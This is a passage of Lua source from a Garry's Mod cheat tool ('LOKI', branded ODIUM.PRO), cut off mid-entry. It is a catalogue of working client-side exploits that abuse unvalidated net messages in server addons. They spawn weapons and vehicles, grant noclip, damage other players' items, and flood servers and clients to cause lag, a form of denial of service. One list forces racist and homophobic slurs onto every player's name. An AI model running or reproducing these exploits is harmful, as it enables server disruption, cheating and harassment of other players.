            if(sploit.bools.enabled && LOKI.Freecam.Enabled == true) then
                local pos = LOKI.Freecam.EyePos() - (LOKI.GetLP():EyePos() - LOKI.GetLP():GetPos())
                LOKI.NetStart(sploit, "079ServerAction")
                net.WriteString("Move")
                net.WriteVector(pos)
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "bool" },
    },
} )
LOKI.AddExploit( "NoClip Exploit", {
    desc = "Enter the spirit realm",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 0,
    vars = {},
    scan = function() return LOKI.ValidNetString( "XMH_TeleportPlayer" ) end,
    hooks = {
        CreateMove = function(tbl, sploit)
            if(sploit.bools.enabled && LOKI.Freecam.Enabled == true) then
                local pos = LOKI.Freecam.EyePos() - (LOKI.GetLP():EyePos() - LOKI.GetLP():GetPos())
                LOKI.NetStart(sploit, "XMH_TeleportPlayer")
                net.WriteVector(pos)
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "bool" },
    },
} )
LOKI.AddExploit( "Vehicle Exploit", {
    desc = "Give yourself a firetruck",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "race_accept" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "FIRE_CreateFireTruck")
            net.SendToServer()    
        end,
    },
    functions = {
        { typ = "func", Name = "Give me wheels", },
    },
} ) 
LOKI.AddExploit( "Weapons Exploit", {
    desc = "Give yourself any weapon",
    severity = 50,
    bools = {enabled = false},
    status = -1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "give_me_weapon" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "give_me_weapon")
            net.WriteString(LOKI.GetStored( "weapons1" ))
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "string", Name = "Weapon Class", default = "weapon_rpg", addr = "weapons1" },
        { typ = "func", Name = "Give me artillery", },
    },
} )
LOKI.AddExploit( "Weapons Exploit", {
    desc = "Give yourself an explosion spell",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "hpwrewrite_achievement1" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "hpwrewrite_achievement1")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "func", Name = "Give me artillery", },
    },
} )
LOKI.AddExploit( "Weapons Exploit", {
    desc = "Give yourself any weapon",
    severity = 50,
    bools = {enabled = false},
    status = -1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "CraftSomething" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "CraftSomething" )
            net.WriteEntity( LOKI.GetLP() )
            net.WriteString( LOKI.GetStored( "weapons2" ) )
            net.WriteString( "" )
            net.WriteString( "weapon" )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "string", Name = "Weapon Class", default = "weapon_rpg", addr = "weapons2" },
        { typ = "func", Name = "Give me artillery", },
    },
} )
LOKI.AddExploit( "Weapons Exploit", {
    desc = "Give yourself any weapon",
    severity = 50,
    bools = {enabled = false},
    status = -1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "SquadGiveWeapon" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "SquadGiveWeapon" )
            net.WriteString(LOKI.GetStored( "weapons3" ))
            net.WriteEntity(LOKI.GetLP())
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "string", Name = "Weapon Class", default = "weapon_rpg", addr = "weapons3" },
        { typ = "func", Name = "Give me artillery", },
    },
} )
LOKI.AddExploit( "Weapons Exploit", {
    desc = "Give yourself any weapon. (works but requires an admin to have used !give at least once since server start)",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "giveweapon" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "giveweapon")
            net.WriteString(LOKI.GetStored( "weapons4" ))
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "string", Name = "Weapon Class", default = "weapon_rpg", addr = "weapons4" },
        { typ = "func", Name = "Give me artillery", },
    },
} )
LOKI.AddExploit( "Weapons Exploit", {
    desc = "Give yourself any weapon",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "CRAFTINGMOD_INVENTORY" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "CRAFTINGMOD_INVENTORY")
            net.WriteTable({type = 4, SWEP = LOKI.GetStored( "weapons5" ), SKIN = 0})
            net.WriteInt(0, 16)
            net.WriteString(tostring(CRAFTINGMOD.PANELS.Inventory_ID))
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "string", Name = "Weapon Class", default = "weapon_rpg", addr = "weapons5" },
        { typ = "func", Name = "Give me artillery", },
    },
} )
LOKI.AddExploit( "Weapons Exploit", {
    desc = "Give or take weapons to/from yourself",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "dialogAlterWeapons" ) end,
    hooks = {
        Think = function(tbl, sploit)
            local weaps = {}
            LOKI.NetStart(sploit, "dialogAlterWeapons", true)
            net.WriteString( tbl[1] )
            if(tbl[2] == "All") then
                if(tbl[1] == "Remove") then
                    for k1, v1 in pairs(v:GetWeapons()) do
                        table.insert(weaps, v1:GetClass())
                    end
                elseif(tbl[1] == "Add") then
                    for k1, v1 in pairs(weapons.GetList()) do
                        weaps[#weaps+1] = v1.ClassName
                    end
                end
            else
                weaps = string.Split( LOKI.GetStored("scpwx_weaps", "weapon_rpg,weapon_smg1"), "," )
            end
            net.WriteTable( weaps )
            net.WriteEntity( LOKI.GetLP() )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "string", Name = "Weapons", default = "weapon_rpg,weapon_smg1", addr = "scpwx_weaps" },
        { typ = "func", Name = "Give", args = {"Add"} },
        { typ = "func", Name = "Take", args = {"Remove"} },
        { typ = "func", Name = "Strip", args = {"Remove", "All"} },
        { typ = "func", Name = "Give All", args = {"Add", "All"} },
    },
} )
LOKI.AddExploit( "Weapons Exploit", {
    desc = "Give yourself any weapon",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "R_PERM.BuyFromShopNPC" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "R_PERM.BuyFromShopNPC")
            net.WriteTable({type="Weapon",class=LOKI.GetStored( "weapons6" ),price=0})
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "string", Name = "Weapon Class", default = "weapon_rpg", addr = "weapons6" },
        { typ = "func", Name = "Give me artillery", },
    },
} )
LOKI.AddExploit( "Weapons Exploit", {
    desc = "Give yourself default weapons",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "XMH_HandleWeapons" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "XMH_HandleWeapons")
            net.WriteString("xmh_givehl2weapons")
            net.SendToServer()
            LOKI.NetStart(sploit, "XMH_HandleWeapons")
            net.WriteString("xmh_givegmweapons")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "func", Name = "Give me artillery", },
    },
} )
LOKI.AddExploit( "Ammo Exploit", {
    desc = "Get unlimited ammo for every weapon",
    severity = 50,
    bools = {enabled = false},
    status = -1,
    times_per_tick = math.huge,
    prevalidated = true,
    scan = function() return LOKI.ValidNetString( "TCBBuyAmmo" ) && net.Receivers["tcbsendammo"] end,
    hooks = {
        Think = function(tbl, sploit)
            for k,v in pairs(GAMEMODE.AmmoTypes) do
                LOKI.NetStart(sploit, "TCBBuyAmmo")
                net.WriteTable( {nil,v.ammoType,nil,"0","999999"} )
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "string", Name = "Weapon Class", default = "weapon_rpg", addr = "weapons2" },
        { typ = "func", Name = "Give me artillery", },
    },
} ) 
LOKI.AddExploit( "Join Police", {
    desc = "Join the police force without going through the fucking form",
    severity = 50,
    bools = {enabled = false},
    status = -1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "PoliceJoin" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "PoliceJoin" )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "func", Name = "Become a cop", },
    },
} ) 
LOKI.AddExploit( "Join Police", {
    desc = "Join the police force without going through the fucking form",
    severity = 50,
    bools = {enabled = false},
    status = -1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "CpForm_Answers" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "CpForm_Answers")
            net.WriteEntity(LOKI.GetLP())
            net.WriteTable({})
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "func", Name = "Become a cop", },
    },
} ) 
LOKI.AddExploit( "Printer Smasher", {
    desc = "Apply constant damage to any printers nearby",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    msgs_per_tick = 3,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "customprinter_get" ) end,
    hooks = {
        Tick = function(tbl, sploit)
            for k, v in ipairs( LOKI.ents.FindByGlobal("IsCustomHQ") ) do
                if ( v:GetPos():Distance( LOKI.GetLP():GetPos() ) <= 750 ) then
                    LOKI.NetStart( sploit, "customprinter_get")
                    net.WriteEntity(v)
                    net.WriteString("onoff")
                    net.SendToServer()
                    LOKI.NetStart( sploit, "customprinter_get")
                    net.WriteEntity(v)
                    net.WriteString("c_off")
                    net.SendToServer()
                    LOKI.NetStart( sploit, "customprinter_get")
                    net.WriteEntity(v)
                    net.WriteString("p_up")
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
local Names = { "Nigger", "Faggot", "Kike", "Cuckmaster", "Skid", "GetODIUM.PRO", "ODIUM.PRO", "Shit", "Piss", "Permavirgin", "CitizenRat", "Feminist", "Fuckhead", "Cunt", "ODIUM.PRO", "CockWart", "DickTickle", "FuckAdmins", "Paidmin", "ShitServer" }
LOKI.AddExploit( "Name Changer", {
    desc = "Destroy everybodys RPNames",
    severity = 50,
    bools = {enabled = false},
    status = 2,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "NC_GetNameChange" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs( player.GetAll() ) do
                LOKI.NetStart( sploit, "NC_GetNameChange")
                net.WriteEntity(v)
                net.WriteString(table.Random(Names))
                net.WriteString(table.Random(Names))
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Lag the shit out of the server",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    msgs_per_tick = 3,
    times_per_tick = 300,
    prevalidated = true,
    scan = function() return LOKI.ValidNetString( "ATS_WARP_REMOVE_CLIENT", "ATS_WARP_FROM_CLIENT", "ATS_WARP_VIEWOWNER" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "ATS_WARP_REMOVE_CLIENT" )
            net.WriteEntity( LOKI.GetLP() )
            net.WriteString( "adminroom1" )
            net.SendToServer()
            LOKI.NetStart( sploit, "ATS_WARP_FROM_CLIENT" )
            net.WriteEntity( LOKI.GetLP() )
            net.WriteString( "adminroom1" )
            net.SendToServer()
            LOKI.NetStart( sploit, "ATS_WARP_VIEWOWNER" )
            net.WriteEntity( LOKI.GetLP() )
            net.WriteString( "adminroom1" )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Lag the shit out of the server",
    severity = 90,
    bools = {enabled = false},
    status = 3,
    msgs_per_tick = function() return player.GetCount * 3 end,
    times_per_tick = math.huge,
    prevalidated = true,
    scan = function() return LOKI.ValidNetString( "CFCreateGame", "CFJoinGame", "CFRemoveGame", "CFEndGame" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k,v in ipairs(player.GetAll()) do
                LOKI.NetStart( sploit, "CFRemoveGame" )
                net.WriteFloat( math.Round( "10000\n" ) )
                net.SendToServer()
                LOKI.NetStart( sploit, "CFJoinGame" )
                net.WriteFloat( math.Round( "10000\n" ) )
                net.SendToServer()
                LOKI.NetStart( sploit, "CFEndGame" )
                net.WriteFloat( "10000\n" )
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Moves the server onto an african ISP (Discovered by niku)",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "CreateCase" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "CreateCase" )
            net.WriteString( "tapped by ODIUM.PRO" )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Gee I wonder what this does",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "rprotect_terminal_settings" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "rprotect_terminal_settings" )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Causes more lag on servers already lagging",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "StackGhost" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "StackGhost" )
            net.WriteInt(0xFFFFFFFF,32)
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Instantly brings large servers to a crawl",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "tbfy_surrender" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "tbfy_surrender")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Creates a lot of lag",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return LOKI.DynamicNetString( "RXCar" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit)
        end,
    },
    functions = {
        { typ = "bools", tbl = {"RXCar_BuyCar_C2S", "RXCAR_UpdateINVCar_C2S", "RXCAR_Shop_Store_C2S", "RXCAR_Shop_Sell_C2S", "RXCAR_RespawnINV_C2S", "RXCAR_SellINVCar_C2S", "RXCAR_Shop_Buy_C2S", "RXCAR_RequestTuneData_C2S"}}
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Creates a lot of lag",
    severity = 90,
    bools = {enabled = false},
    status = 2,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "NewReport" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "NewReport" )
            net.SendToServer() 
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Client Lagger", {
    desc = "Causes ALL players to lag out",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    msgs_per_tick = 2,
    times_per_tick = math.huge,
    prevalidated = true,
    scan = function() local num = LOKI.RecursiveGetVar(CF, {"FlipPriceMinimum"}, "number") return LOKI.ValidNetString( "CFCreateGame", "CFJoinGame", "CFRemoveGame", "CFEndGame" ) end, --&& isnumber(num) && num <= 0 end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "CFCreateGame" )
            net.WriteFloat( 0 )
            net.WriteFloat( 0 )
            net.SendToServer()
        end,
        net = {
            Receive = function(sploit, strName)
                if(strName == "CFAnnounce") then
                    return false
                end
            end,
        },
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Client Lagger", {
    desc = "Causes players to lag out",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    msgs_per_tick = function(sploit) return #LOKI.GetStored( "clagger1_plyz", {} ) end,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "PrtToPlayers" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(LOKI.GetStored( "clagger1_plyz", {} )) do
                if IsValid(v) then
                    LOKI.NetStart( sploit, "PrtToPlayers" )
                    net.WriteEntity(v)
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        { typ = "players", addr = "clagger1_plyz" },
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Client Lagger", {
    desc = "Mom get off the phone I'm trying to play Runescape!",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("scoreboard.country") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "scoreboard.country")
            net.WriteString(system.GetCountry())
            net.SendToServer()
        end,
        net = {
            Receive = function(sploit, strName)
                if(strName == "scoreboard.country") then 
                    return false
                end
            end,
        },
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Client Lagger", {
    desc = "Dial-up internet bro!",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("gMining.registerWeapon") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "gMining.registerWeapon")
            net.WriteTable({})
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Client Lagger", {
    desc = "Dab on the players",
    severity = 100,
    bools = {enabled = false},
    status = 2,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("JukeBox_PlayersTunedIn") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "JukeBox_PlayersTunedIn")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Client Lagger", {
    desc = "Remind everyone what it feels like to game on a notebook",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("pac_to_contraption") end,
    hooks = {
        Think = function(tbl, sploit)
            local tbl = LOKI.RecursiveGetVar(sploit, {"vars", "tbl"}, "table", true)
            if(!tbl || #tbl == 0) then
                for i=1,60 do
                    tbl[#tbl + 1] = {id = i, mdl = "models/error.mdl", pos = Vector(0,0,0), ang = Angle(0,0,0), clr = Color(0,0,0), skn = 0}
                end
            end
            LOKI.NetStart( sploit, "pac_to_contraption" )
            net.WriteTable( tbl )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Client Lagger", {
    desc = "Lag out all nearby players",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    prevalidated = true,
    scan = function() return (LOKI.ValidNetString( "bodyman_model_change" ) && istable(BODYMAN)) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "bodyman_model_change")
            net.WriteInt( 0, 8 )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Client Lagger", {
    desc = "Mom get off the phone I'm trying to play Runescape!",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    prevalidated = true,
    scan = function() return LOKI.ValidNetString("GotCountry") && istable(playerCountryTable) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "GotCountry")
            net.WriteString(LOKI.GetStored("clc1", system.GetCountry()))
            net.SendToServer()
        end,
        net = {
            Receive = function(sploit, strName)
                if(strName == "CountryToTable") then 
                    return false
                end
            end,
        },
    },
    functions = {
        { typ = "bool", },
        { typ = "string", Name = "Country (ISO 3166-1)", default = system.GetCountry(), addr = "clc1" },
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Causes lag and bombs the server console",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "steamid2" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "steamid2" )
            net.WriteString( "ODIUM.PRO > ALL" )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Poison the server",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "start_alch" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "start_alch")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "OMG DDOS!?!?",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return LOKI.DynamicNetString( "netKeycard" ) || LOKI.DynamicNetString( "netFKeycard" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit, function()
                net.WriteEntity(LOKI.GetLP())
            end)
        end,
    },
    functions = {
        { typ = "bools", tbl = {"netFKeycardAdminSpawn", "netFKeycardSpawn", "netFKeycardHackSpawn", "netFKeycardSAddLevel", "netFKeycardSRemoveLevel", "netKeycardSAddPlayer", "netKeycardSRemovePlayer", "netKeycardSpawn", "netKeycardHackSpawn", "netKeycardAdminSpawn"}}
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Few second lag spikes at best but could probably cripple some smaller servers",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "ctOS-Box-Hacked" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "ctOS-Box-Hacked")
            net.WriteEntity(LOKI.GetLP())
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Meant to cause excessive lag but ends up just overflowing local host, needs work",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    vars = {},
    scan = function() return LOKI.ValidNetString( "ViewClaims" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "ViewClaims")
            net.SendToServer()
        end,
        net = {
            Receive = function(sploit, strName)
                if(strName == "ViewClaims") then
                    return false
                end
            end,
        },
    },
    functions = {
        { typ = "bool", },
    },
} )
/*local pModel = 0;
LOKI.AddExploit( "Lagsploit", {
    desc = "Causes lag as well as either T-Posing you or breaking your anims",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    prevalidated = true,
    scan = function() return (LOKI.ValidNetString( "bodyman_model_change" ) && LOKI.GetLP().getJobTable != nil) end,
    hooks = {
        Think = function(tbl, sploit)
            local job = LOKI.GetLP():getJobTable()
            local playermodels = job.model
            if pModel < #playermodels then
                pModel = pModel + 1
                LOKI.NetStart( sploit, "bodyman_model_change")
                net.WriteInt( pModel, 8 )
                net.SendToServer()
            else
                pModel = 0
            end
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )*/
LOKI.AddExploit( "Lagsploit", {
    desc = "Drag the server to it's knees",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "DW_GUNLAB_UPDATEORB" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "DW_GUNLAB_UPDATEORB")
            for i = 1, 4 do
                net.WriteInt(i,4)
            end
            net.WriteInt(LOKI.GetLP():EntIndex(), 32)
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Relatively strong exploit, can cause 5-10 second spikes",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "DW_PLAYSONG" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "DW_PLAYSONG")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Imagine playing on a server in China while torrenting",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "selfportrait_idonthavehands" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "selfportrait_idonthavehands")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Causes some pretty hectic spikes",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "dw_toggle_item" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "dw_toggle_item")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Few seconds of lag at a time, just enough to be annoying",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "tupacBail.bailPlayer" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, 'tupacBail.bailPlayer' )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} ) 
LOKI.AddExploit( "Lagsploit", {
    desc = "Fill the servers vulnerable little holes",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    prevalidated = true,
    scan = function() return (ulx && ulx.friends && LOKI.ValidNetString( "sendtable" )) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "sendtable" )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} ) 
LOKI.AddExploit( "Lagsploit", {
    desc = "Brutalize the poor unsuspecting server",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "vloot_pickup_request" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "vloot_pickup_request" )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} ) 
LOKI.AddExploit( "Lagsploit", {
    desc = "Remember kids, always trust the client",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "disguise" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "disguise" )
            net.WriteInt(0xFFFFFFFF, 32)
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} ) 
LOKI.AddExploit( "Lagsploit", {
    desc = "Brew a 0xFFFFFFFF potion",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "NET_AM_MakePotion" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "NET_AM_MakePotion" )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} ) 
LOKI.AddExploit( "Lagsploit", {
    desc = "Pew pew",
    severity = 90,
    bools = {enabled = false},
    status = 2,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "orgcheckname" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "orgcheckname" )
            net.WriteString("ODIUM.PRO")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} ) 
LOKI.AddExploit( "Lagsploit", {
    desc = "Old but should still work",
    severity = 90,
    bools = {enabled = false},
    status = -1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "dLogsGetCommand" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "dLogsGetCommand" )
            net.WriteTable({cmd="+forward", args="ODIUM.PRO"})
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Same shit, different smell",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return LOKI.DynamicNetString( "ItemStore" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit, function()
                net.WriteEntity(LOKI.GetLP())
            end)
        end,
    },
    functions = {
        { typ = "bools", tbl = {"ItemStoreSyncItem", "ItemStoreMerge", "ItemStoreUse", "ItemStoreSplit", "ItemStoreSyncItem2"}}
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "This addon has quite a few exploits",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "ats_send_toServer" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "ats_send_toServer")
            net.WriteTable({ " " , "Open" , nil , nil , nil , nil })
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )     
LOKI.AddExploit( "Lagsploit", {
    desc = "I swear these devs couldn't code to save their lives",
    severity = function() return math.Clamp(player.GetCount(), 1, 100) end,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
